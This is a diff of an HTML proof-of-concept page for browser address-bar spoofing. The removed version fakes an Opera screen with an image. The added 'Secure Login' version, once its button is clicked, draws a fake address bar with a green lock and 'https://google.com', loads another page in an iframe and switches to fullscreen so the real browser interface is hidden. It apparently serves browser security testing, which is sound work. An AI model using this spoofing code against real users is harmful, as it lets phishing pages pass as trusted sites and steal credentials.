@@ -1,41 +1,215 @@
+<!!DOCTYPE html>
 
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <title>Security UI Spoof</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-            }         
-            #spoof {
-                width:  100%;
-                height: 100%;
-            }
-        </style>
-        <script>
-         function x() {
-setTimeout(()=>{
 
-                document.getElementById("spoof").style   = "display: block;";
-                document.getElementById("content").style = "display: none;";
-                document.documentElement.requestFullscreen();
 
-},500)
-            }
+<html>
 
-        </script>
-    </head>  
-    <body>
-        <img id="spoof" style="display: none;" src="xa.jpg"></img>
-        <div id="content">
-            <br><br><br>
-            <center>
-                <h1>Navigate to Opera <a href=# onclick=x()>https://www.opera.com/</h1>
-            </center>
-        </div>
-    </body>
-  </body>
+
+<head>
+
+
+  <title>Secure Login</title>
+
+
+  <style>
+
+
+    html, body {
+
+
+      margin: 0;
+
+
+      padding: 0;
+
+
+      overflow: hidden;
+
+
+      font-family: sans-serif;
+
+
+      background: #ffffff;
+
+
+    }
+
+
+    .addressbar-spoof {
+
+
+      position: fixed;
+
+
+      top: 0;
+
+
+      left: 0;
+
+
+      height: 40px;
+
+
+      width: 100%;
+
+
+      background: #f1f1f1;
+
+
+      display: flex;
+
+
+      align-items: center;
+
+
+      padding-left: 10px;
+
+
+      font-size: 14px;
+
+
+      z-index: 9999;
+
+
+    }
+
+
+    .secure {
+
+
+      color: green;
+
+
+      font-weight: bold;
+
+
+      margin-right: 6px;
+
+
+    }
+
+
+    iframe {
+
+
+      position: absolute;
+
+
+      top: 40px;
+
+
+      left: 0;
+
+
+      width: 100%;
+
+
+      height: calc(100% - 40px);
+
+
+      border: none;
+
+
+    }
+
+
+    #trigger {
+
+
+      position: absolute;
+
+
+      top: 50%;
+
+
+      left: 50%;
+
+
+      transform: translate(-50%, -50%);
+
+
+      font-size: 18px;
+
+
+      padding: 20px;
+
+
+      background: #111;
+
+
+      color: white;
+
+
+      border: none;
+
+
+      cursor: pointer;
+
+
+    }
+
+
+  </style>
+
+
+</head>
+
+
+<body>
+
+
+
+
+
+<button id="trigger">Navigate to google.com</button>
+
+
+
+
+
+<script>
+
+
+  const trigger = document.getElementById("trigger");
+
+
+
+
+
+  trigger.onclick = () => {
+
+
+    document.body.innerHTML = `
+
+
+      <div class="addressbar-spoof">
+
+
+        <span class="secure">🔒</span> https://google.com
+
+
+      </div>
+
+
+      <iframe src="test3.html"></iframe>
+
+
+    `;
+
+
+    document.documentElement.requestFullscreen().catch(console.error);
+
+
+  };
+
+
+</script>
+
+
+
+
+
+</body>
+
+
 </html>
